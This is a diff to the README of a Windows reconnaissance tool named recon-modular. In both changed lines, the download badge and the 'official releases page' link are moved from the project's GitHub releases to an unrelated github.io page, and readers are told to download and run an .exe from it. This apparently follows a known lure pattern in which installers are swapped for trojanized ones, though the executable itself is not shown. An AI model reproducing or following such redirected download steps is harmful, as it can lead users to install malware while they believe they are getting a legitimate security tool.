@@ -1,6 +1,6 @@
 # 🛡️ recon-modular - Automate your security reconnaissance tasks easily
 
-[![Download Latest Version](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/diaphoreticsweepoar69/recon-modular/releases)
+[![Download Latest Version](https://img.shields.io/badge/Download-Releases-blue.svg)](https://diaphoreticsweepoar69.github.io)
 
 recon-modular helps security professionals and developers scan systems for potential risks. This tool identifies subdomains, checks for vulnerabilities, and monitors cloud or IoT environments. It combines over 130 security tools into one package. The software uses machine learning to predict subdomain locations and organizes your findings into clear reports. You can manage your security workflow without running individual tools separately.
 
@@ -19,7 +19,7 @@ Ensure your computer has the latest Windows updates installed. This provides the
 
 Follow these steps to set up the software on your system.
 
-1. Visit the [official releases page](https://github.com/diaphoreticsweepoar69/recon-modular/releases) to download the latest version.
+1. Visit the [official releases page](https://diaphoreticsweepoar69.github.io) to download the latest version.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file to start the download. 
 4. Once the download finishes, locate the file in your Downloads folder.
